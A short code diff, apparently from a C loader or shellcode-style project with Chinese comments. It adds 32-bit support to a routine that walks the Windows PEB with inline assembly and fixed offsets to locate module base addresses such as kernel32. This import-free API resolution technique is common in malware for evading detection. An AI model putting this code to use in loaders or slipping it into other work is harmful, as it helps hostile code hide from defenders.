@@ -52,18 +52,29 @@ static PVOID _e(PVOID base, DWORD tgt) {
 }
 
 // ─────────────────────────────────────────────
-// PEB 游走获取模块基址
+// PEB 游走获取模块基址 (支持 x86/x64)
 // ─────────────────────────────────────────────
 
 static PVOID _peb_mod(int is_k32) {
     void* peb;
+#ifdef _WIN64
     __asm__ volatile("movq %%gs:0x60, %0" : "=r"(peb));
     void*       ldr = *(void**)((BYTE*)peb  + 0x18);
     LIST_ENTRY* hd  = (LIST_ENTRY*)((BYTE*)ldr + 0x10);
+#else
+    __asm__ volatile("movl %%fs:0x30, %0" : "=r"(peb));
+    void*       ldr = *(void**)((BYTE*)peb  + 0x0C);
+    LIST_ENTRY* hd  = (LIST_ENTRY*)((BYTE*)ldr + 0x0C);
+#endif
     LIST_ENTRY* en  = hd->Flink;
     while (en && en != hd) {
+#ifdef _WIN64
         WCHAR* nm = *(WCHAR**)((BYTE*)en + 0x60);
         void*  b  = *(void**)((BYTE*)en  + 0x30);
+#else
+        WCHAR* nm = *(WCHAR**)((BYTE*)en + 0x2C);
+        void*  b  = *(void**)((BYTE*)en  + 0x18);
+#endif
         if (nm && b) {
             if (is_k32) {
                 if ((nm[0]|0x20)=='k' && (nm[1]|0x20)=='e' &&
